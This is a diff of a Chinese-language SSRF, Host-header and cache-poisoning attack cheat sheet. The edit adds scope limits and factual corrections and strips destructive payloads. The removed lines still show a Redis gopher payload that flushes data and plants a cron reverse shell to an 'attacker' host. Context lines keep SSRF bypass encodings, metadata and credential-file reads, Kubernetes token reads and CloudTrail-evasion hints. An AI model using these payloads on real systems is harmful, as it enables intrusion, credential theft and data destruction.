@@ -2,13 +2,19 @@
 
 > 视角：黑盒，目标是让目标服务器代我访问内网 / 云元数据 / 投毒缓存
 
+## 实验条件与证据边界
+
+第8节限制优先：只用自有隔离服务与合成数据，不读取/使用云临时凭证、不下载真实桶、不修改 IAM 或共享服务。下文凭证利用、S3 sync、创建密钥/Lambda/特权 Pod 和 Redis 写入是历史链条说明，不是报告验证步骤。缓存参数 cb 不保证在缓存键中；先在隔离缓存配置中证明完整键隔离并有清除方法，不能仅因用了随机参数就投毒生产缓存。
+
+SSRF 方法、Header、重定向和协议支持由真实客户端决定：外层 curl 的方法/头不会自动透传；重定向也不保证允许 file/gopher。IMDSv2/GCP/Azure 的方法、令牌与 Header 条件仍适用。URL 字符串、HTTP 状态、长度、User-Agent 和出站 IP 不能单独证明内网服务、客户端类型或源站归属。出站 IP 可能是 NAT/代理，与入口源站不同。Kubernetes API 需要 HTTPS、认证与 RBAC，拥有 Pod 创建权不保证能创建 privileged/hostPath Pod；release_agent 为版本/权限相关的 cgroup v1 技术，不能泛称任意容器逃逸。
+
 ## 1. 一句话说清
 
 - **SSRF**：让服务器替你向"它能到、你不能到"的地方发请求。
 - **Host Header 注入**：通过伪造 Host / X-Forwarded-* 让应用错误地构造 URL / 缓存键。
 - **缓存投毒**：把恶意响应固化到共享缓存层，让后续用户中招。
 
-SRC 价值：未授权 SSRF→云元数据 → P0 ($3k–$20k)；缓存投毒（管理后台） → P1。
+严重度和赏金依实际权限、数据和业务影响评估，不能由漏洞类型或元数据可达性固定推算。
 
 ---
 
@@ -65,7 +71,7 @@ Forwarded: for=...; host=...
 url=https://your-oob-domain.com/abc
 
 # 看 OOB 平台是否收到请求
-# 收到 → 至少基本 SSRF 存在
+# 收到回连是请求线索；需区分 DNS 解析、扫描器/浏览器访问与目标服务实际 HTTP 请求，并验证预期授权边界。
 ```
 
 ### 3.2 内网探测
@@ -126,7 +132,7 @@ file://localhost/etc/passwd
 dict://127.0.0.1:6379/info
 dict://127.0.0.1:11211/stats
 
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
+# 删除原含 FLUSHALL 的破坏性 Redis 序列；与第8节禁止写/删的边界冲突。
 gopher://127.0.0.1:25/ ... SMTP
 
 ldap://127.0.0.1:389/
@@ -263,12 +269,12 @@ curl -I "https://target/admin;%2f"
   → 内网端口扫描（http://10.0.0.0/8 各端口）
   → 内网 Redis 写 SSH key（gopher://）
   → 云元数据 → IAM 临时凭据（AWS STS / GCP token）
-  → IAM 凭据 → 全云控制
+  → IAM 凭据 → 仅在其 IAM/SCP/边界/资源策略允许的范围内操作，不能推断全云控制
   → S3 / OSS bucket 读写
   → 横向到 Kubernetes API
 ```
 
-参考真实价值：H1 平台 AWS metadata SSRF 报告 $5k–$50k 普遍。
+历史个别赏金不能作为当前预期或普遍分布，本文未提供统计证据。
 
 ### Host Header 利用链
 
@@ -302,7 +308,7 @@ Web Cache Deception
 通用指纹：
 - `?url=https://oob.attacker.cc/x` → OOB 平台收到 → 基本 SSRF
 - 收到的 User-Agent 含 `wkhtmltopdf` / `Headless Chrome` / `Java/1.x` → 渲染器/HTTP 客户端
-- 试 `file:///etc/passwd` 返回 200 → 协议白名单缺
+- file:// 返回 200 不能证明读取；需受控 canary 内容和独立请求来源证据
 - 试 `http://169.254.169.254/...` 返回 token JSON → 云 metadata 可达
 
 ---
@@ -479,7 +485,7 @@ http://0177.0.0.1 (八进制)
 http://2130706433 (十进制)
 http://0x7f000001 (十六进制)
 http://127.1 (简写)
-http://127.0.0.1.nip.io (DNS重绑定)
+http://127.0.0.1.nip.io（静态地址编码 DNS，不自动是重绑定）
 ```
 
 **2. URL解析差异**
@@ -497,7 +503,7 @@ _DNS重绑定攻击_
 使用DNS重绑定服务:
 http://7f000001.cip.cc (解析为127.0.0.1)
 http://127.0.0.1.nip.io
-第一次解析为外网IP，第二次解析为内网IP
+只有受控 DNS 实际返回不同地址且检查/使用发生差异才可能构成重绑定；这些域名不保证这种行为。
 ```
 
 ---
@@ -689,7 +695,7 @@ http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01
 **1. 绕过Metadata头检查**
 _绕过请求头验证_
 ```
-使用HTTP请求走私或重定向绕过Metadata头检查
+走私/重定向本身不会满足 Metadata: true 要求；需确认 SSRF 实际向 IMDS 发送的请求方法/头，外层 curl 的头不保证被代理转发。
 ```
 
 ---
@@ -722,7 +728,7 @@ dict://127.0.0.1:11211/stats
 **3. 3. Gopher协议**
 _使用Gopher协议攻击内网服务_
 ```
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
+# 删除原含 FLUSHALL 的破坏性 Redis 序列；与第8节禁止写/删的边界冲突。
 构造Redis命令
 ```
 
@@ -772,7 +778,7 @@ _后面是实际发送的数据
 **2. 2. 攻击Redis**
 _写入cron任务反弹Shell_
 ```
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+# 删除原含 FLUSHALL 的破坏性 Redis 序列；与第8节禁止写/删的边界冲突。
 ```
 
 **3. 3. 攻击MySQL**
@@ -938,7 +944,7 @@ http://0177.0.0.1 (八进制)
 http://2130706433 (十进制)
 http://0x7f000001 (十六进制)
 http://127.1 (简写)
-http://127.0.0.1.nip.io (DNS重绑定)
+http://127.0.0.1.nip.io（静态地址编码 DNS，不自动是重绑定）
 http://127.0.0.1.xip.io
 ```
 
@@ -963,7 +969,7 @@ _DNS重绑定攻击_
 ```
 http://7f000001.cip.cc
 http://127.0.0.1.nip.io
-第一次解析为外网IP，第二次解析为内网IP
+只有受控 DNS 实际返回不同地址且检查/使用发生差异才可能构成重绑定；这些域名不保证这种行为。
 ```
 
 **5. 5. IPv6绕过**
@@ -1024,7 +1030,7 @@ http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network
 **3. 3. 自建DNS服务器**
 _自建DNS重绑定服务器_
 ```
-# 使用dnspython搭建
+# 概念草图：导入的是 dnslib，不是 dnspython；resolve 返回字符串而非完整 DNS 响应，也没有服务启动代码。
 from dnslib import *
 class RebindResolver:
     def __init__(self):
@@ -1483,8 +1489,8 @@ cloudfox aws --profile target all-checks
 
 **WAF/EDR 绕过变体：**
 
-**1. 绕过CloudTrail和GuardDuty检测**
-_通过使用非标准区域、低速操作和会话令牌降低被检测的风险_
+**1. 检测覆盖假设（不是规避保证）**
+_IAM 为全局服务，临时凭据和服务间调用仍可记录；区域/延迟不证明无日志。由防御方核对实际覆盖。_
 ```
 # 使用非标准区域(可能未开启CloudTrail)
 aws iam list-users --region af-south-1
@@ -1522,7 +1528,7 @@ ls /var/run/secrets/kubernetes.io/serviceaccount/
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
 # 检查特权模式
-ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
+# 创建接口只说明某些网络权限（如 CAP_NET_ADMIN），不证明 privileged 容器；此探测会修改网络状态，不用作只读检查。
 fdisk -l 2>/dev/null | head
 capsh --print 2>/dev/null | grep "Current"
 ```
@@ -1594,8 +1600,8 @@ curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
 
 **WAF/EDR 绕过变体：**
 
-**1. 绕过PodSecurityPolicy/OPA**
-_通过切换命名空间、使用临时容器和CronJob绕过Pod安全策略_
+**1. 历史 PSP 与现行准入边界**
+_PSP 已在 Kubernetes 1.25 移除；这些资源不自动绕过 RBAC、Pod Security Admission 或自定义准入。_
 ```
 # 使用非default命名空间(可能未应用PSP)
 curl -s "$K8S/api/v1/namespaces" -H "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'
@@ -1955,10 +1961,11 @@ cdn_resp=$(curl -s "https://target.com/" | md5sum)
 direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
 echo "CDN: $cdn_resp"
 echo "Direct: $direct_resp"
-[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"
+[ "$cdn_resp" = "$direct_resp" ] && echo "[候选] 内容相同不证明源站归属或可扩大测试范围"
 
 # 3. 修改hosts绕过CDN测试:
-echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts
+curl --resolve "target.com:443:${REAL_IP}" https://target.com/
+# 请求级解析覆盖，保留域名/SNI；不修改系统 hosts。
 
 # 4. 直接对真实IP进行渗透(绕过CDN的WAF):
 nmap -sV -p 1-65535 ${REAL_IP}
@@ -1970,7 +1977,7 @@ nmap -sV -p 1-65535 ${REAL_IP}
 **1. 绕过CDN WAF的多种技术**
 _利用真实IP和非标端口绕过CDN的WAF防护_
 ```
-# 找到真实IP后，CDN的WAF就被完全绕过了
+# 源站 IP 只是候选；网络 ACL、TLS/SNI、源站认证与自身防护仍可能阻止访问。
 # 但如果目标自身也有WAF，还需要:
 
 # 1. 使用真实IP直接访问(绕过CDN WAF):
@@ -1986,7 +1993,7 @@ curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"
 
 # 4. 源站IP白名单探测:
 # 某些源站配置了仅允许CDN IP访问
-# 尝试伪造CDN的IP:
+# 改 HTTP 转发头不能伪造网络源 IP 或突破网络层 CDN IP 白名单。
 curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
 curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
 ```
@@ -2060,7 +2067,7 @@ https://lock.cmpxchg8b.com/rebinder.html?2   # 自定义 IP
 
 #### 3. 302 重定向跟随绕过
 
-服务端只对**用户提交的 URL**做校验,但 `curl --location` / `requests follow_redirects=True` 会跟随 302 跳到任意 URL。在攻击者域上挂 `header("Location: http://internal/")` 即可。
+服务端只对**用户提交的 URL**做校验,但 `curl --location` / `requests allow_redirects=True` 会跟随 302 跳到任意 URL。在攻击者域上挂 `header("Location: http://internal/")` 即可。
 
 ```php
 <?php
